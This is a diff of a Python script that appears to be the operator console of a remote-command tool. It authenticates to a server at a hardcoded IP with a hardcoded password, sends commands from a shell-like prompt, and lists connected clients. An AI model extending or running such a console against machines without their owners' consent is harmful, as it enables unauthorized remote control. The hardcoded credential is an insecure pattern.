@@ -46,8 +46,8 @@ class Client:
 		
 
 if __name__ == "__main__":
-	SERVER_HOST = "212.115.110.10"
-	# SERVER_HOST = "192.168.1.103"
+	# SERVER_HOST = "212.115.110.10"
+	SERVER_HOST = "192.168.1.103"
 	SERVER_PORT = 7546
 	SUPER_PASSWORD = "jesus_134"
 	# client = Client("26.35.239.192", SERVER_PORT, SUPER_PASSWORD)
@@ -56,6 +56,8 @@ if __name__ == "__main__":
 	client.send(SUPER_PASSWORD)
 	while True:
 		data = input(f"[{SERVER_HOST}:{SERVER_PORT}]$ ")
+		if data == "":
+			client.send(" ")
 		if data == "exit":
 			# del client.admin_thread
 			exit()
@@ -79,3 +81,5 @@ if __name__ == "__main__":
 			
 			df = pd.DataFrame(all_clients_df)
 			print(f"{df}{Fore.RESET}")
+		else:
+			print(response)
